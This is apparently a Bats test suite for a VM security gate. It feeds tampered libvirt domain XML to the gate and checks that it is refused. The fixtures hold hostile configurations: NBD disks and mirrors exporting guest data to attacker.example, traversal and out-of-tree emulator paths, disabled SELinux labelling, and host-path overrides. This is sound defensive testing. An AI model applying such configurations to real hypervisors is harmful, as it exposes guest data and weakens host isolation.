@test "gate: only-simnet counts INTERFACES not <source> nodes (a 2-source iface can't mask a leak)" {
  _mkvm vm2s 2c2c2c2c-0000-0000-0000-000000000000
  # a SECOND interface on default(NAT) with TWO simnet-looking sources must NOT inflate simnics past nics
  sed -i "s:</devices>:<interface type='network'><source network='default'/><source network='simnet'/><port isolated='yes'/></interface></devices>:" "$FV_XML"
  run dr_vps_gate_vm guestexec vm2s; [ "$status" -eq 24 ]
}

@test "gate: guestexec refuses an <emulator> path OUTSIDE /usr (tampered hypervisor binary) -> 24" {
  _mkvm vmemu deademu0-0000-0000-0000-000000000000
  sed -i "s#<emulator>/usr/bin/qemu-system-x86_64</emulator>#<emulator>/evil/qemu</emulator>#" "$FV_XML"
  run dr_vps_gate_vm guestexec vmemu; [ "$status" -eq 24 ]
}

@test "gate: lifecycle REFUSES the overlay attached as a SECONDARY disk behind a foreign primary -> 24" {
  _mkvm vmsec 5ec0ec00-0000-0000-0000-000000000000
  ov="$DR_VPS_POOL_DIR/vmsec.qcow2"
  # foreign nbd PRIMARY (no @file) + the real overlay as the SECOND disk: the first @file is the
  # overlay, but the first DISK ELEMENT is foreign -> must refuse (pre-fix this passed lifecycle).
  printf "<domain><uuid>5ec0ec00-0000-0000-0000-000000000000</uuid><devices><disk type='network' device='disk'><source protocol='nbd' name='foreign'><host name='attacker.example' port='10809'/></source></disk><disk type='file' device='disk'><source file='%s'/></disk><interface type='network'><source network='simnet'/><port isolated='yes'/></interface></devices></domain>\n" "$ov" >"$FV_XML"
  run dr_vps_gate_vm lifecycle vmsec; [ "$status" -eq 24 ]
}

@test "gate: guestexec refuses an <interface><backend tap/vhost> host-path override -> 24" {
  _mkvm vmbk b4ckend0-0000-0000-0000-000000000000
  sed -i "s:<port isolated='yes'/></interface>:<port isolated='yes'/><backend tap='/host/tap' vhost='/host/vhost'/></interface>:" "$FV_XML"
  run dr_vps_gate_vm guestexec vmbk; [ "$status" -eq 24 ]
}

@test "gate: guestexec refuses a /domain/os direct-boot <kernel>/<initrd> host path -> 24" {
  _mkvm vmos 050b0070-0000-0000-0000-000000000000
  sed -i "s:<boot dev='hd'/></os>:<kernel>/var/lib/libvirt/boot/evil</kernel><initrd>/var/lib/libvirt/boot/evil-ird</initrd><boot dev='hd'/></os>:" "$FV_XML"
  run dr_vps_gate_vm guestexec vmos; [ "$status" -eq 24 ]
}

@test "gate: guestexec refuses <seclabel type='none'> (disables QEMU MAC confinement) -> 24" {
  _mkvm vmsl 5ec0ab00-0000-0000-0000-000000000000
  sed -i "s:<seclabel type='dynamic' model='selinux' relabel='yes'/>:<seclabel type='none'/>:" "$FV_XML"
  run dr_vps_gate_vm guestexec vmsl; [ "$status" -eq 24 ]
}

@test "gate: guestexec refuses <cpu mode='host-passthrough'> (bare host CPU) -> 24" {
  _mkvm vmcpu c9000000-0000-0000-0000-000000000000
  sed -i "s:<cpu mode='host-model'/>:<cpu mode='host-passthrough'/>:" "$FV_XML"
  run dr_vps_gate_vm guestexec vmcpu; [ "$status" -eq 24 ]
}

@test "gate: guestexec refuses a non-template top-level <sysinfo> (host data injection) -> 24" {
  _mkvm vmsi 51900000-0000-0000-0000-000000000000
  sed -i "s:<devices>:<sysinfo type='smbios'><system><entry name='serial'>HOST</entry></system></sysinfo><devices>:" "$FV_XML"
  run dr_vps_gate_vm guestexec vmsi; [ "$status" -eq 24 ]
}

@test "gate: guestexec refuses a <watchdog action='dump'> (guest-triggerable host write) -> 24" {
  _mkvm vmwd 5a5a5a5a-7777-7777-7777-777777777777
  sed -i "s:</devices>:<watchdog model='i6300esb' action='dump'/></devices>:" "$FV_XML"
  run dr_vps_gate_vm guestexec vmwd; [ "$status" -eq 24 ]
}

@test "gate: guestexec ALLOWS a benign auto-added <watchdog action='reset'> (no refuse-all)" {
  _mkvm vmwr 5b5b5b5b-7777-7777-7777-777777777777
  sed -i "s:</devices>:<watchdog model='itco' action='reset'/></devices>:" "$FV_XML"
  run dr_vps_gate_vm guestexec vmwr; [ "$status" -eq 0 ]
}

@test "gate: guestexec refuses a <disk><mirror> network block-job (guest-data->host egress) -> 24" {
  _mkvm vmmir m1rr0r00-0000-0000-0000-000000000000
  sed -i "s:<target dev='vda' bus='virtio'/></disk>:<target dev='vda' bus='virtio'/><mirror type='network' job='copy'><format type='qcow2'/><source protocol='nbd' name='leak'><host name='attacker.example' port='10809'/></source></mirror></disk>:" "$FV_XML"
  run dr_vps_gate_vm guestexec vmmir; [ "$status" -eq 24 ]
}

@test "gate: guestexec refuses a <disk><reservations> PR-helper host socket (@path) -> 24" {
  _mkvm vmrsv re5e0000-0000-0000-0000-000000000000
  sed -i "s:<target dev='vda' bus='virtio'/></disk>:<target dev='vda' bus='virtio'/><reservations enabled='yes'><source type='unix' path='/host/pr-helper.sock'/></reservations></disk>:" "$FV_XML"
  run dr_vps_gate_vm guestexec vmrsv; [ "$status" -eq 24 ]
}

@test "gate: guestexec refuses an overlay with an external qcow2 DATA-FILE (hidden host storage) -> 18" {
  _mkvm vmdf da7af11e-0000-0000-0000-000000000000
  ov="$DR_VPS_POOL_DIR/vmdf.qcow2"; rm -f "$ov"
  qemu-img create -f qcow2 -F qcow2 -b "$DR_VPS_POOL_DIR/g.qcow2" -o data_file="$DR_VPS_POOL_DIR/leak.raw" "$ov" >/dev/null 2>&1
  run dr_vps_gate_vm guestexec vmdf; [ "$status" -eq 18 ]   # E_VERIFY, same class as the backing-chain check
  [[ "$output" == *data-file* ]]
}

@test "gate: guestexec refuses a TRAVERSAL emulator path '/usr/../../tmp/evil' (canonical != /usr) -> 24" {
  _mkvm vmtrav 7ada7ada-0000-0000-0000-000000000000
  sed -i "s#<emulator>/usr/bin/qemu-system-x86_64</emulator>#<emulator>/usr/../../tmp/evil-qemu</emulator>#" "$FV_XML"
  run dr_vps_gate_vm guestexec vmtrav; [ "$status" -eq 24 ]
  [[ "$output" == *canonicalize* ]]
}

@test "gate: guestexec ALLOWS a /usr/libexec emulator (canonical under /usr, no refuse-all)" {
  _mkvm vmlx 7ada7ada-1111-0000-0000-000000000000
  sed -i "s#<emulator>/usr/bin/qemu-system-x86_64</emulator>#<emulator>/usr/libexec/qemu-kvm</emulator>#" "$FV_XML"
  run dr_vps_gate_vm guestexec vmlx; [ "$status" -eq 0 ]
}

@test "gate: guestexec refuses a simnet NIC WITHOUT <port isolated='yes'> (regains VM<->VM L2) -> 24" {
  _mkvm vmni 11111111-2222-3333-4444-555555555555
  sed -i "s:<port isolated='yes'/>::" "$FV_XML"
  run dr_vps_gate_vm guestexec vmni; [ "$status" -eq 24 ]
}
